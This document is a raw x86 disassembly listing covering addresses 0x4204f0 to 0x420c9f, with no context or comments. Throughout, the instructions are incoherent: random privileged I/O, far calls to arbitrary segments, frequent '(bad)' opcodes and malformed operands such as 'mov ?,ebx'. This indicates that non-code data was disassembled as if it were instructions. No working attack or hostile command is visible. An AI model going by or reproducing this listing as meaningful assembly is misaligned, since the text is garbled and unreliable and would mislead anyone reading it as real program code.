  4204f0:	shr    DWORD PTR [ecx],1
  4204f2:	sbb    al,0x7c
  4204f4:	cmp    bl,BYTE PTR [esi-0x19458001]
  4204fa:	jge    0x420550
  4204fc:	cmp    ebx,DWORD PTR [ecx+0x289e824e]
  420502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420503:	ins    DWORD PTR es:[edi],dx
  420504:	xor    al,0xe3
  420506:	sti    
  420507:	or     BYTE PTR [ebx+0x69a8fc10],ah
  42050d:	data16 or al,0xb7
  420510:	fs aas 
  420512:	popa   
  420513:	sub    bh,bh
  420515:	mov    esp,0x92577d95
  42051a:	int    0x4b
  42051c:	enter  0xe672,0x16
  420520:	xlat   BYTE PTR ds:[ebx]
  420521:	mov    ebx,0xbb38478a
  420526:	fstp   TBYTE PTR [eax]
  420528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420529:	lods   al,BYTE PTR ds:[esi]
  42052a:	lods   al,BYTE PTR ds:[esi]
  42052b:	push   edi
  42052c:	daa    
  42052d:	jp     0x42058d
  42052f:	int3   
  420530:	cdq    
  420531:	sub    cl,BYTE PTR [ecx+0x121f822e]
  420537:	xor    ebp,ecx
  420539:	pushf  
  42053a:	test   al,0x6e
  42053c:	in     al,0x8c
  42053e:	adc    edx,0xd7a199f0
  420544:	adc    al,0xa5
  420546:	(bad)  
  420547:	stc    
  420548:	sbb    eax,0x322b658d
  42054d:	fldenv [edi+0x10]
  420550:	in     eax,0xa0
  420552:	daa    
  420553:	in     eax,0xdf
  420555:	fwait
  420556:	mov    al,ds:0x3f2cdfa0
  42055b:	sub    eax,0x5ff7e60f
  420560:	cmp    BYTE PTR [edi-0x30],ah
  420563:	mov    ds:0xa69b21f8,eax
  420568:	mov    ds:0x88f37b7d,al
  42056d:	push   ds
  42056e:	push   esi
  42056f:	test   cl,0xeb
  420572:	fadd   st,st(7)
  420574:	sar    DWORD PTR [edx],0x11
  420577:	mov    ?,ebx
  420579:	jp     0x42051b
  42057b:	mov    dl,cl
  42057d:	jno    0x4205e6
  42057f:	sbb    BYTE PTR [ecx-0x2cecc9cb],cl
  420585:	dec    ebx
  420586:	jb     0x42058e
  420588:	or     edx,DWORD PTR [ebp+0x54]
  42058b:	aad    0x9d
  42058d:	xor    ah,bh
  42058f:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420591:	fcomi  st,st(0)
  420593:	scas   eax,DWORD PTR es:[edi]
  420594:	pop    edx
  420595:	dec    edx
  420596:	lds    ecx,FWORD PTR [ebx+edi*8]
  420599:	jl     0x4205dd
  42059b:	es cdq 
  42059d:	(bad)  
  42059e:	fnstsw ax
  4205a0:	fxch   st(4)
  4205a2:	sub    al,0x24
  4205a4:	(bad)  
  4205a5:	rcl    BYTE PTR [edx-0x69],0x62
  4205a9:	inc    esp
  4205aa:	jp     0x42059b
  4205ac:	das    
  4205ad:	sbb    DWORD PTR [ecx+0x3a],ecx
  4205b0:	sbb    eax,0x42bc5f44
  4205b5:	mov    al,0x46
  4205b7:	and    ah,bh
  4205b9:	inc    edi
  4205ba:	lea    esp,[eax-0x73]
  4205bd:	fs cmp al,0x6d
  4205c0:	push   0xffffffbd
  4205c2:	bound  ecx,QWORD PTR [esi-0x52]
  4205c5:	cmp    BYTE PTR [esi],ah
  4205c7:	call   0x1efab02f
  4205cc:	cs or  eax,0x63c4cbfd
  4205d2:	jle    0x4205c7
  4205d4:	mov    ebx,0x948f44c8
  4205d9:	cli    
  4205da:	out    0xbe,eax
  4205dc:	loopne 0x420624
  4205de:	cmp    al,BYTE PTR [esi-0x5ce0286f]
  4205e4:	fld    TBYTE PTR [eax-0x14]
  4205e7:	cmp    BYTE PTR [esp+edi*1+0x40],dh
  4205eb:	fst    QWORD PTR [ecx]
  4205ed:	stc    
  4205ee:	xchg   ecx,eax
  4205ef:	pop    ds
  4205f0:	dec    ebp
  4205f1:	add    dh,al
  4205f3:	(bad)  
  4205f4:	out    dx,al
  4205f5:	loope  0x4205a4
  4205f7:	add    al,0x6b
  4205f9:	push   ecx
  4205fa:	(bad)  
  4205fb:	sbb    esi,DWORD PTR [ecx-0x3a45de44]
  420601:	adc    eax,0x98144d32
  420606:	cli    
  420607:	pop    ecx
  420608:	ds in  eax,dx
  42060a:	les    esi,FWORD PTR [eax+ebx*1+0x2a1a7099]
  420611:	mov    al,ds:0x718334f8
  420616:	cmp    ah,BYTE PTR [edx-0x48]
  420619:	test   eax,0xb38d18e
  42061e:	jns    0x4205c0
  420620:	call   0x1ec0:0x2c51f8ed
  420627:	mov    dh,0xd
  420629:	lods   al,BYTE PTR ds:[esi]
  42062a:	cmp    WORD PTR gs:[esi-0xe],bx
  42062f:	in     al,dx
  420630:	inc    edx
  420631:	vpmuldq xmm3,xmm0,xmm5
  420636:	in     al,dx
  420637:	leave  
  420638:	inc    BYTE PTR ds:0x1526e5f0
  42063e:	test   DWORD PTR [ecx],edi
  420640:	jo     0x420657
  420642:	add    ebx,DWORD PTR [edx-0x460b44c9]
  420648:	sub    ecx,DWORD PTR [ebx]
  42064a:	out    dx,eax
  42064b:	push   0xffffffad
  42064d:	xchg   edi,eax
  42064f:	pop    ds
  420650:	mov    ah,0x6a
  420652:	cmp    BYTE PTR [ebx],bl
  420654:	or     DWORD PTR [ebx],0x76
  420657:	out    0x58,al
  420659:	dec    esi
  42065a:	cmp    eax,0xbee1b8fa
  42065f:	les    esi,FWORD PTR [eax+0x495e9b8b]
  420665:	mov    ch,0xe0
  420667:	or     eax,0x324048d4
  42066c:	pop    edi
  42066d:	loopne 0x420626
  42066f:	pop    edx
  420670:	or     BYTE PTR [esi+esi*8+0x58],bh
  420674:	inc    edx
  420675:	sbb    eax,0xcc9737a8
  42067a:	jbe    0x4206ea
  42067c:	pop    ebx
  42067d:	mov    ebp,0x13242c28
  420682:	dec    ebp
  420683:	xor    BYTE PTR [edx-0x6f07b663],dh
  420689:	mov    edi,0x1eff623b
  42068e:	inc    esp
  42068f:	scas   al,BYTE PTR es:[edi]
  420690:	dec    esi
  420691:	cs inc esp
  420693:	fs jno 0x420688
  420696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420697:	imul   esi,eax,0xd22f8bec
  42069d:	fs cmp eax,0x26b6aafb
  4206a3:	jp     0x420698
  4206a5:	nop
  4206a6:	sub    esp,DWORD PTR [edi+0x67]
  4206a9:	lods   al,BYTE PTR ds:[esi]
  4206aa:	mov    cl,0x37
  4206ac:	xchg   edi,eax
  4206ad:	iret   
  4206ae:	popa   
  4206af:	pusha  
  4206b0:	leave  
  4206b1:	push   eax
  4206b2:	gs push es
  4206b4:	mov    edx,db3
  4206b7:	add    edi,eax
  4206b9:	je     0x420725
  4206bb:	loope  0x420690
  4206bd:	xor    eax,0x20c7e7ad
  4206c2:	or     BYTE PTR [edx+0x61],dl
  4206c5:	and    al,0x8d
  4206c7:	and    ah,cl
  4206c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206ca:	lods   al,BYTE PTR cs:[esi]
  4206cc:	inc    edx
  4206cd:	pop    ebp
  4206ce:	push   eax
  4206cf:	(bad)
  4206d3:	adc    cl,al
  4206d5:	leave  
  4206d6:	mov    ds:0x3a593736,al
  4206db:	jmp    0x42068a
  4206dd:	dec    esp
  4206de:	sahf   
  4206df:	in     al,dx
  4206e0:	cwde   
  4206e1:	popf   
  4206e2:	nop
  4206e3:	jle    0x42068b
  4206e5:	loope  0x4206aa
  4206e7:	mov    eax,0x9e3e10
  4206ec:	sub    eax,0x64d42345
  4206f1:	in     eax,dx
  4206f2:	pop    ebp
  4206f4:	inc    ecx
  4206f5:	and    DWORD PTR [eax],ebx
  4206f7:	lea    si,[ebx+edi*1+0x3c]
  4206fc:	sar    DWORD PTR [edi+0x23],cl
  4206ff:	rcl    edx,cl
  420701:	sbb    al,0x26
  420703:	popa   
  420704:	mov    dl,0x30
  420706:	enter  0xf69a,0x5f
  42070a:	aas    
  42070b:	aas    
  42070c:	xor    al,0xed
  42070e:	mov    dh,0x65
  420710:	retf   0x4c51
  420713:	mov    eax,es:0x7ba4005b
  420719:	(bad)  
  42071a:	fist   DWORD PTR [esi-0x6c]
  42071d:	aas    
  42071e:	lock adc al,0x7f
  420721:	fcom   DWORD PTR [edi]
  420723:	pop    edx
  420724:	xchg   edx,eax
  420725:	hlt    
  420726:	(bad)  [esp+esi*8+0x7de08367]
  42072d:	jnp    0x4206b2
  42072f:	mov    ds:0x8ea0a78b,al
  420734:	add    BYTE PTR [eax-0x491a4bf8],ah
  42073a:	pop    esp
  42073b:	or     eax,0x28bfb6ad
  420740:	dec    eax
  420741:	inc    edi
  420742:	xor    eax,0x904bc23c
  420747:	or     cl,bl
  420749:	mov    cl,0x41
  42074b:	aad    0xfa
  42074d:	test   al,0xff
  42074f:	sbb    dl,BYTE PTR [edi+0x1e]
  420752:	fmul   st(2),st
  420754:	push   ebp
  420755:	xchg   edi,eax
  420756:	mov    ds:0x7525a92f,al
  42075b:	cli    
  42075c:	xchg   edi,eax
  42075d:	push   edx
  42075e:	daa    
  42075f:	inc    edi
  420760:	cdq    
  420761:	call   0xf6e1:0x4f98fb29
  420768:	sub    al,0x7d
  42076a:	pop    es
  42076b:	sbb    bl,BYTE PTR [eax-0x70fe2ead]
  420771:	or     ah,BYTE PTR [eax+ecx*2]
  420774:	mov    edi,0x83a140d4
  420779:	leave  
  42077a:	leave  
  42077b:	(bad)  
  42077c:	repz sbb BYTE PTR ds:0x8ae0d351,ah
  420783:	xchg   edx,eax
  420784:	adc    DWORD PTR [esp+eax*2+0x4b],ecx
  420788:	shr    DWORD PTR [ebp+0x50],0x19
  42078c:	sub    DWORD PTR [ecx-0x3a],ecx
  42078f:	std    
  420790:	retf   0xc1f
  420793:	cld    
  420794:	or     edi,ebp
  420796:	push   ebx
  420797:	pop    es
  420798:	aad    0xf4
  42079a:	xor    edi,esp
  42079c:	add    ecx,DWORD PTR ds:0xff06fd2d
  4207a2:	icebp  
  4207a3:	cld    
  4207a4:	ins    DWORD PTR es:[edi],dx
  4207a5:	xchg   ebp,eax
  4207a6:	into   
  4207a7:	je     0x4207ea
  4207a9:	lods   eax,DWORD PTR ds:[esi]
  4207aa:	sbb    DWORD PTR [eax+edx*4],ecx
  4207ad:	adc    DWORD PTR [edi],0xffffff84
  4207b0:	pusha  
  4207b1:	test   ah,ah
  4207b3:	test   al,0xef
  4207b5:	push   es
  4207b6:	ret    
  4207b7:	sub    cl,BYTE PTR [ebp-0x7b]
  4207ba:	fcmovb st,st(6)
  4207bc:	xchg   edx,eax
  4207bd:	dec    DWORD PTR [ecx-0x65009eaa]
  4207c3:	dec    edx
  4207c4:	aad    0x31
  4207c6:	or     edx,DWORD PTR [ecx]
  4207c8:	out    dx,eax
  4207c9:	mov    al,0x7e
  4207cb:	jo     0x42078b
  4207cd:	(bad)  
  4207ce:	mov    BYTE PTR [edi-0x7df6a8a],ch
  4207d4:	ins    DWORD PTR es:[edi],dx
  4207d5:	cmc    
  4207d6:	repnz sbb ch,BYTE PTR [esi]
  4207d9:	and    eax,0x5b210a8f
  4207de:	inc    ebp
  4207df:	mov    ah,0xd1
  4207e1:	mov    cl,0x74
  4207e3:	push   0x69bfa83c
  4207e8:	sub    ah,bh
  4207ea:	js     0x4207dc
  4207ec:	lds    esp,FWORD PTR [esi+0x5a9d1789]
  4207f2:	test   al,ah
  4207f4:	inc    esi
  4207f5:	and    cx,WORD PTR [edi-0x2]
  4207f9:	int    0x27
  4207fb:	call   0x8dd0:0xdbb16ffc
  420802:	mov    DWORD PTR [ebx+0x150b7ad7],0xb2021d70
  42080c:	adc    edi,0x21af4395
  420812:	cmp    dl,dh
  420814:	or     al,0x8
  420816:	xor    dl,BYTE PTR [esi+0x3eeed88d]
  42081c:	stos   DWORD PTR es:[edi],eax
  42081d:	pop    esp
  42081e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42081f:	pop    ebp
  420820:	push   ebx
  420821:	xchg   DWORD PTR [edx+0x61],esi
  420824:	jno    0x4208a2
  420826:	(bad)  
  420827:	in     al,dx
  420828:	jno    0x420885
  42082a:	xchg   BYTE PTR [ecx-0x2165ad2a],bh
  420830:	and    eax,edx
  420832:	mov    eax,0xfcf94a0b
  420837:	pop    es
  420838:	icebp  
  420839:	(bad)  
  42083a:	div    BYTE PTR [ebp+0x716e98eb]
  420840:	xchg   edi,eax
  420841:	dec    eax
  420842:	mov    al,0xd1
  420844:	mov    bl,ah
  420846:	nop
  420847:	push   0xf8c87e3d
  42084c:	lock mov ah,0x4a
  42084f:	inc    esi
  420850:	sub    edi,ebx
  420852:	lock xor dl,cl
  420855:	pop    ds
  420856:	cs popf 
  420858:	cld    
  420859:	or     DWORD PTR [ebx+0x5678f21a],eax
  42085f:	pop    ds
  420860:	enter  0x6fae,0xf0
  420864:	cmp    DWORD PTR [edi+eax*4-0x49b95369],eax
  42086b:	jecxz  0x4207f2
  42086d:	or     BYTE PTR ds:0xf80bb77e,cl
  420873:	ret    
  420874:	pop    ecx
  420875:	mov    bh,0x74
  420877:	mov    eax,ds:0xe3cb0ab2
  42087c:	out    dx,eax
  42087d:	lock pusha 
  42087f:	adc    eax,0xe6299dc0
  420884:	lahf   
  420885:	in     al,dx
  420886:	mov    esi,ebp
  420888:	pop    ecx
  420889:	xor    eax,DWORD PTR [esp+edx*8]
  42088c:	cmc    
  42088d:	mov    dl,0x65
  42088f:	loopne 0x42083f
  420891:	xor    BYTE PTR [edx+ebx*2-0x4438cb4c],ch
  420898:	mov    bl,0x24
  42089a:	push   es
  42089b:	sbb    DWORD PTR [eax+0x52],eax
  42089e:	jbe    0x4208c1
  4208a0:	jg     0x42090c
  4208a2:	pop    ebx
  4208a3:	and    esi,DWORD PTR [ebx+0xd]
  4208a6:	xchg   ebx,eax
  4208a7:	xchg   edx,eax
  4208a8:	leave  
  4208a9:	sub    cl,BYTE PTR [ebx+0x4292d5d1]
  4208af:	fmul   DWORD PTR gs:[edx+0x69]
  4208b3:	leave  
  4208b4:	cmp    eax,0xd587b77e
  4208b9:	and    ch,0x47
  4208bc:	xchg   ebx,eax
  4208bd:	repnz sbb cl,cl
  4208c0:	test   eax,0xb797017c
  4208c5:	inc    eax
  4208c6:	out    0x61,al
  4208c8:	ret    0x4669
  4208cb:	sub    ebx,DWORD PTR [edx+ebp*2]
  4208ce:	push   0x1761ad25
  4208d3:	fstp   DWORD PTR [ecx]
  4208d5:	dec    esi
  4208d6:	dec    edi
  4208d7:	mov    eax,DWORD PTR [edx]
  4208d9:	out    dx,al
  4208da:	fmul   QWORD PTR [esi]
  4208dc:	sub    al,0x2d
  4208de:	popf   
  4208df:	imul   esp,DWORD PTR [edi+0x2f],0x6f84be30
  4208e6:	les    ebx,FWORD PTR [edx+esi*8-0x77]
  4208ea:	sub    dh,BYTE PTR ds:0xc34d284b
  4208f0:	xchg   ecx,eax
  4208f1:	mov    dl,BYTE PTR [eax+0x15280162]
  4208f7:	fwait
  4208f8:	mov    esi,0xa9b3eac6
  4208fd:	jp     0x4208f7
  4208ff:	(bad)  
  420900:	int    0xc4
  420902:	cmp    DWORD PTR [ebx],esp
  420904:	add    al,0x24
  420906:	push   eax
  420907:	inc    ecx
  420908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420909:	sti    
  42090a:	add    ebp,ebx
  42090c:	mov    ch,BYTE PTR [ebx+0x7]
  42090f:	cmp    BYTE PTR [ebp-0x46],ch
  420912:	loope  0x42092a
  420914:	outs   dx,BYTE PTR ds:[esi]
  420915:	xor    eax,0xadc77650
  42091a:	fcmovne st,st(6)
  42091c:	shl    DWORD PTR [esi+0x52dd7fdc],1
  420922:	fsub   QWORD PTR [esi]
  420924:	jp     0x4208fe
  420926:	add    DWORD PTR ds:0x96e0fa16,0x4f47f440
  420930:	jle    0x4208e1
  420932:	xor    edx,DWORD PTR [eax+edx*8+0x192a7399]
  420939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42093a:	in     eax,dx
  42093b:	xor    al,0x61
  42093d:	dec    esi
  42093e:	inc    esi
  42093f:	loopne 0x420931
  420941:	out    dx,al
  420942:	mov    ah,BYTE PTR [eax-0x32]
  420945:	adc    WORD PTR [edx],sp
  420948:	dec    ebx
  420949:	sbb    al,bl
  42094b:	cmp    DWORD PTR [edx+0x473a6a84],edx
  420951:	pop    esi
  420952:	mov    BYTE PTR [eax+0x5965480f],dl
  420958:	sbb    BYTE PTR [ebp-0x12ea20c],dh
  42095e:	xor    edi,DWORD PTR [edi+0x46]
  420961:	sub    bh,BYTE PTR [edi+0x26]
  420964:	adc    esp,eax
  420966:	and    BYTE PTR ds:0x923ff44e,0x3b
  42096d:	es aaa 
  42096f:	pushf  
  420970:	cmc    
  420971:	iret   
  420972:	outs   dx,BYTE PTR ds:[esi]
  420973:	std    
  420974:	cmp    ebx,DWORD PTR [eax]
  420976:	xchg   DWORD PTR [ecx+0x5e],esi
  420979:	pushf  
  42097a:	retf   
  42097b:	fdivr  QWORD PTR [eax+0x4a]
  42097e:	ins    BYTE PTR es:[edi],dx
  42097f:	cs jle 0x420937
  420982:	jno    0x420987
  420984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420985:	cmp    dh,dl
  420987:	imul   ebp,esi,0x63c1d9bc
  42098d:	jl     0x420a04
  42098f:	inc    esp
  420990:	repz daa 
  420992:	arpl   WORD PTR [esi-0x43],sp
  420995:	cmp    BYTE PTR [esi-0x2d],bl
  420998:	xchg   DWORD PTR [edi],ebx
  42099a:	out    0x6e,eax
  42099c:	arpl   bp,di
  42099e:	jo     0x4209a6
  4209a0:	retf   0x68f2
  4209a3:	(bad)  
  4209a4:	call   0x6685ebf8
  4209a9:	pusha  
  4209aa:	fdiv   st(1),st
  4209ac:	mov    dl,0x22
  4209ae:	ins    BYTE PTR es:[edi],dx
  4209af:	inc    esi
  4209b0:	shl    DWORD PTR [edx+0x7f],1
  4209b3:	or     BYTE PTR [ecx+0x716b7bab],ah
  4209b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209ba:	arpl   WORD PTR [edi+edi*4-0x7392c6b],sp
  4209c1:	and    al,0x19
  4209c3:	fdiv   DWORD PTR [esi-0x500de277]
  4209c9:	(bad)  
  4209ca:	dec    edx
  4209cb:	dec    ebx
  4209cc:	mov    edi,0xa4a3fe90
  4209d1:	lods   eax,DWORD PTR ds:[esi]
  4209d2:	and    al,0x63
  4209d4:	inc    esi
  4209d5:	(bad)  
  4209d7:	jb     0x4209d8
  4209d9:	pop    es
  4209da:	mov    esp,0x540f4e6
  4209df:	adc    esp,DWORD PTR [ecx+ebp*4-0x3508b3b5]
  4209e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209e7:	das    
  4209e8:	add    ah,BYTE PTR [ebx]
  4209ea:	call   0xd3a0b291
  4209ef:	mov    cx,0xc75a
  4209f3:	fisubr DWORD PTR [esi+0x41]
  4209f6:	mov    fs,WORD PTR [ebp-0x37]
  4209f9:	mov    dh,0x32
  4209fb:	popa   
  4209fc:	inc    eax
  4209fd:	xchg   edx,eax
  4209fe:	in     al,dx
  4209ff:	inc    ecx
  420a00:	pop    eax
  420a01:	or     al,0xe6
  420a03:	cdq    
  420a04:	adc    ch,BYTE PTR [edi-0x76]
  420a07:	call   0x3f0f838e
  420a0c:	ds scas eax,DWORD PTR es:[edi]
  420a0e:	outs   dx,DWORD PTR ds:[esi]
  420a0f:	mov    edx,0xd7f34393
  420a14:	clc    
  420a15:	and    DWORD PTR [esp+ebx*8+0x7f],ecx
  420a19:	out    0xee,eax
  420a1b:	sbb    eax,DWORD PTR gs:[esi-0x666936f5]
  420a22:	sub    BYTE PTR [ebp-0x64],bl
  420a25:	xchg   DWORD PTR [ebp+eax*2-0x5239e6b2],ebx
  420a2c:	aaa    
  420a2d:	adc    al,0xfa
  420a2f:	rol    BYTE PTR [edi],1
  420a31:	pop    ds
  420a32:	push   es
  420a33:	daa    
  420a34:	cmp    ebp,DWORD PTR ds:0x9b90b8be
  420a3a:	lock clc 
  420a3c:	imul   BYTE PTR [ebx]
  420a3e:	nop
  420a3f:	push   ebp
  420a40:	mov    ebx,0xe2dd9de7
  420a45:	(bad)  
  420a46:	les    eax,FWORD PTR [edi+0x3]
  420a49:	ja     0x420ac3
  420a4b:	sub    DWORD PTR [ebp+0x4e],edx
  420a4e:	mov    cl,0x95
  420a50:	mov    esi,DWORD PTR [esi+0x2d9f044c]
  420a56:	push   ds
  420a57:	std    
  420a58:	out    0x94,al
  420a5a:	fdivr  DWORD PTR [eax-0x48037595]
  420a60:	imul   ecx,ebx,0xffffffb5
  420a63:	push   ss
  420a64:	push   cs
  420a65:	xchg   BYTE PTR [edi+0x47768c6e],bh
  420a6b:	xor    BYTE PTR [ebp-0x9],0xfe
  420a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a70:	inc    esp
  420a71:	iret   
  420a72:	pop    ds
  420a73:	xchg   edi,eax
  420a74:	into   
  420a75:	push   ds
  420a76:	mov    edi,0x46bb7339
  420a7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a7c:	sub    ecx,esp
  420a7e:	mov    ebp,DWORD PTR [ebx+0x35b0f0bc]
  420a84:	inc    eax
  420a85:	mov    ch,0x52
  420a87:	push   ecx
  420a88:	in     eax,dx
  420a89:	lds    eax,FWORD PTR [edx]
  420a8b:	std    
  420a8c:	xchg   esp,eax
  420a8d:	ss rol ebx,1
  420a90:	ret    0x5a4
  420a93:	ror    DWORD PTR cs:[ebx+ebx*8+0x69965c0d],cl
  420a9b:	(bad)  
  420a9c:	es pop ebp
  420a9e:	mov    ds:0xb988575a,eax
  420aa3:	sbb    esi,DWORD PTR [ecx-0xf]
  420aa6:	aam    0x4
  420aa8:	sub    dl,cl
  420aaa:	mov    dl,0x68
  420aac:	mov    cl,0xea
  420aae:	in     eax,0x8f
  420ab0:	rcr    bl,0xe3
  420ab3:	mov    bh,0x41
  420ab5:	add    ah,BYTE PTR [edi-0x19]
  420ab8:	sbb    BYTE PTR ds:0x10c28ff7,al
  420abe:	adc    DWORD PTR [ebx],esp
  420ac0:	loop   0x420a55
  420ac2:	fisubr WORD PTR [esp+ebp*8-0x556cb069]
  420ac9:	adc    BYTE PTR [ebp+0x68],ch
  420acc:	fs into 
  420ace:	jno    0x420b32
  420ad0:	and    dl,BYTE PTR [ebx]
  420ad2:	or     eax,0x1ae6d75d
  420ad7:	cmc    
  420ad8:	jmp    0x6455:0xc57d182a
  420adf:	mov    edi,0x137b7e46
  420ae4:	repnz dec ecx
  420ae6:	outs   dx,BYTE PTR ds:[esi]
  420ae7:	cs retf 
  420ae9:	xor    bl,BYTE PTR [ebp+0x68]
  420aec:	or     BYTE PTR [eax],dl
  420aee:	mov    ebp,es
  420af0:	adc    BYTE PTR [edx-0x3c2887db],bl
  420af6:	add    ecx,ebp
  420af8:	xor    eax,DWORD PTR [ecx-0x2874d1fb]
  420afe:	loope  0x420a90
  420b00:	out    dx,eax
  420b01:	dec    ebx
  420b02:	cmp    DWORD PTR [ecx],edi
  420b04:	or     BYTE PTR [esi-0x7e40b14d],bh
  420b0a:	or     cx,WORD PTR [ebx-0x329681cf]
  420b11:	jae    0x420b3b
  420b13:	dec    esp
  420b14:	and    DWORD PTR [ebx-0x2f],eax
  420b17:	es mov edi,0xfb13b93f
  420b1d:	push   eax
  420b1e:	xchg   esp,eax
  420b1f:	mov    ds:0x8a7badb9,al
  420b24:	ins    BYTE PTR es:[edi],dx
  420b25:	pop    ecx
  420b26:	add    DWORD PTR [ecx],eax
  420b28:	adc    al,0xf2
  420b2a:	jecxz  0x420b74
  420b2c:	pop    edx
  420b2d:	push   0xffffffe0
  420b2f:	jmp    0x420b6d
  420b31:	sahf   
  420b32:	add    dl,BYTE PTR [esi+ebp*8]
  420b35:	and    BYTE PTR [ecx+0x51],al
  420b38:	in     al,dx
  420b39:	push   es
  420b3a:	not    DWORD PTR [ecx]
  420b3c:	popa   
  420b3d:	mov    eax,ds:0x8bc5cbdf
  420b42:	pusha  
  420b43:	jge    0x420b15
  420b45:	ret    
  420b46:	cmp    esp,edi
  420b48:	icebp  
  420b49:	(bad)  
  420b4a:	sbb    bl,BYTE PTR [esi-0xcc9a2df]
  420b50:	out    0xe3,al
  420b52:	pop    ebx
  420b53:	or     ch,ah
  420b55:	push   eax
  420b56:	ins    DWORD PTR es:[edi],dx
  420b57:	mov    dh,0x71
  420b59:	cdq    
  420b5a:	retf   0xfd3b
  420b5d:	mov    ds:0x6860681,al
  420b62:	inc    eax
  420b63:	lods   al,BYTE PTR ds:[esi]
  420b64:	dec    eax
  420b65:	mov    DWORD PTR ds:[edx],edx
  420b68:	jae    0x420b27
  420b6a:	sbb    al,0xdd
  420b6c:	sub    BYTE PTR [esi+ebp*2-0x5c],ch
  420b70:	imul   BYTE PTR [ebp+0x6f75ca5c]
  420b76:	leave  
  420b77:	mov    esi,0x697d2bb
  420b7c:	into   
  420b7d:	pusha  
  420b7e:	fadd   st,st(2)
  420b80:	inc    edx
  420b81:	dec    ecx
  420b82:	(bad)  
  420b83:	int    0xd6
  420b85:	retf   0x7014
  420b88:	daa    
  420b89:	frstor [ebp+ecx*4-0x1d]
  420b8d:	sahf   
  420b8e:	xchg   edx,eax
  420b8f:	test   al,0x2c
  420b91:	add    edi,0xb5ab2d5d
  420b97:	outs   dx,BYTE PTR ds:[esi]
  420b98:	sbb    BYTE PTR [esi-0xd],cl
  420b9b:	cld    
  420b9c:	int3   
  420b9d:	or     eax,0xe10a5a80
  420ba2:	pop    ss
  420ba3:	(bad)  
  420ba4:	adc    eax,0xb1e1246c
  420ba9:	add    al,0x61
  420bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bac:	dec    eax
  420bad:	loope  0x420b42
  420baf:	jecxz  0x420b72
  420bb1:	xor    BYTE PTR [esi-0x787ae998],ah
  420bb7:	or     eax,DWORD PTR [ecx+0x472e3070]
  420bbd:	adc    al,0x78
  420bbf:	push   eax
  420bc0:	sahf   
  420bc1:	imul   DWORD PTR [ebp+0x4e]
  420bc4:	and    bl,BYTE PTR [esi+0x50680d7a]
  420bca:	ficomp DWORD PTR [ecx-0x2c]
  420bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bce:	adc    BYTE PTR [edx+0x357fda06],0x43
  420bd5:	jo     0x420b74
  420bd7:	mov    eax,ds:0xedca7f75
  420bdc:	scas   al,BYTE PTR es:[edi]
  420bdd:	imul   esp,DWORD PTR [ecx-0x10],0x11
  420be1:	add    BYTE PTR [ecx-0xbabb455],ah
  420be7:	dec    esp
  420be8:	out    0x0,al
  420bea:	fmul   DWORD PTR [ebx+0xb4f262f]
  420bf0:	add    al,0x48
  420bf2:	ins    DWORD PTR es:[edi],dx
  420bf3:	push   ds
  420bf4:	clc    
  420bf5:	xchg   ebx,eax
  420bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bf7:	push   ds
  420bf8:	fiadd  DWORD PTR [esi+0x4541b36]
  420bfe:	test   al,0xf5
  420c00:	dec    edi
  420c01:	sar    DWORD PTR [ecx+0x788b7de5],1
  420c07:	dec    ebp
  420c08:	aas    
  420c09:	xchg   ebp,eax
  420c0a:	inc    ecx
  420c0b:	mov    ds:0x31f9e6f5,eax
  420c10:	fiadd  WORD PTR [ecx]
  420c12:	daa    
  420c13:	in     eax,dx
  420c14:	push   cs
  420c15:	mov    eax,cs
  420c17:	aad    0x7b
  420c19:	mov    dl,0x8d
  420c1b:	inc    ebx
  420c1c:	and    bl,al
  420c1e:	cmp    DWORD PTR [eax+ecx*2-0x7d],ecx
  420c22:	push   ebp
  420c23:	into   
  420c24:	add    al,0xb4
  420c26:	jmp    0x895d:0x652b92c6
  420c2d:	retf   0x6ab
  420c30:	ret    
  420c31:	invd   
  420c33:	outs   dx,BYTE PTR ds:[esi]
  420c34:	fimul  WORD PTR [ebx+0x722e0715]
  420c3a:	aaa    
  420c3b:	rcr    edi,1
  420c3d:	(bad)  
  420c3e:	in     eax,dx
  420c3f:	cmp    al,0x82
  420c41:	rcl    DWORD PTR [ecx+ebp*1],0x2f
  420c45:	or     ecx,DWORD PTR [edi+0x46]
  420c48:	xor    eax,ebp
  420c4a:	pop    ds
  420c4b:	xor    edi,esi
  420c4d:	or     edi,ebp
  420c4f:	ror    edx,cl
  420c51:	sar    dl,0x7c
  420c54:	xchg   ecx,eax
  420c55:	test   BYTE PTR ds:[esi+0x64],cl
  420c59:	les    esi,FWORD PTR [eax]
  420c5b:	add    DWORD PTR [edi+eiz*2-0x4e],0xffffffa3
  420c60:	push   eax
  420c61:	pop    edx
  420c62:	(bad)  
  420c63:	fcom   QWORD PTR [ebp+0x11d63fa8]
  420c69:	rcr    DWORD PTR [edx-0x74],0x1e
  420c6d:	jecxz  0x420cc0
  420c6f:	push   cs
  420c70:	inc    ecx
  420c71:	sub    BYTE PTR [ebx-0x6f0fadd4],ah
  420c77:	mov    ds:0x87f6e8e1,al
  420c7c:	cmp    al,0xfa
  420c7e:	outs   dx,DWORD PTR ds:[esi]
  420c7f:	cli    
  420c80:	mov    dl,0x71
  420c82:	ja     0x420cde
  420c84:	and    BYTE PTR [ecx],cl
  420c86:	into   
  420c87:	add    esp,ebp
  420c89:	int    0x6b
  420c8b:	jle    0x420cc5
  420c8d:	mov    dh,0xd1
  420c8f:	nop
  420c90:	fbld   TBYTE PTR gs:[ecx-0x621e9be1]
  420c97:	repz or edi,edi
  420c9a:	int3   
  420c9b:	aad    0x43
  420c9d:	dec    ecx
  420c9e:	scas   eax,DWORD PTR es:[edi]
  420c9f:	mov    ch,0x24
